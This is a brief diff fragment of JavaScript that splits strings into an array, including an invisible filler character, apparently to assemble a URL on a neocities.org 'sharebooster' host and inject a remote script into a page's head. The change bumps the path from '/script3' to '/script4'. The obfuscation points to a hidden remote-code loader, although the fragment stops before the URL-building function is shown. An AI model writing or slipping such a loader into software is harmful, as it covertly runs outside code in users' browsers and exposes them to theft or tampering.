@@ -2,7 +2,7 @@
   const _ = [
     'script', 'type', 'text/javascript', 'src', 'createElement', 'appendChild',
     'onload', 'log', 'onerror', 'error', 'head', 'document', 'https', '://',
-    'share', 'booster', '.neo', 'cities', '.org', '/script3', 'ㅤ', '.js'
+    'share', 'booster', '.neo', 'cities', '.org', '/script4', 'ㅤ', '.js'
   ];
   
   const buildUrl = () => 
